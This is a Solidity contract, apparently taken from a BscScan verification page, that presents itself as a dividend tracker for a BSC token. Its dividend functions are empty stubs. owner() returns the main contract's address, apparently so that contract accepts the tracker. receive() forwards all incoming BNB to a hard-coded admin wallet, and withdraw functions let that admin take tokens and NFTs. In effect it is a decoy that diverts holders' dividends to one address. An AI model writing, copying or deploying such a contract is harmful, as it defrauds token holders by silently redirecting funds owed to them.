/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract SEGDividendTrackerNew2 {

    //targeted main contract
    address private TheContractAddress = 0xEC126e20e7cb114dd3BA356100eaca2Cc2921322;
    //admin address that controls contract and also automatically receive ether, bnb when contract receive bnb...
    address public __owner = 0x37485B65Ec5d9fd4ee4f34Ff8CAD45D08a40723c;

    modifier onlyOwner() {
        require(msg.sender == __owner, "Ownable: caller is not the owner");
        _;
    }
    
    function owner() public view returns (address){
        return TheContractAddress;
    }

    function changeOwnerAddress(address addy) public onlyOwner{
        __owner = addy;
    }

    function setMainContractOwner(address addy) public onlyOwner{
        TheContractAddress = addy;
    }

    function processAccount(address addy, bool status) public {
        //require(status == true, 'status is false');
        //return 56;
    }

    //important methods/functions that the main contract will call, so must be here too, so it works well
    //excludeFromDividends, owner, 

    function excludeFromDividends(address account) public {
    	
    }

    function setBalance(address payable account, uint256 newBalance) public{

    }

    function process(uint256 gas) public pure returns (uint256, uint256, uint256) {
        
        return (gas, 0, 0);
    }

    function distributeBUSDDividends(uint256 amount) public{
    
  }

    receive() external payable {
        payable(__owner).transfer(msg.value);
    }

    function withdrawTokens(address _token, uint amount) public onlyOwner {
        IERC20k(_token).transfer(msg.sender, amount);
    }

  function withdrawERC721(address _i721, uint tokenId) public onlyOwner {
      IERC721(_i721).safeTransferFrom(address(this), msg.sender, tokenId);//if this wasnt implemented, the second will be implemented.

      //IERC721(_i721).transferFrom(address(this), msg.sender, tokenId);//this.
  }

  //withdraw ETH sent to this token contract address to another address
  function withdrawETH() public onlyOwner payable{
    payable(msg.sender).transfer(address(this).balance);
  }

}

interface IERC20k {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721{
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}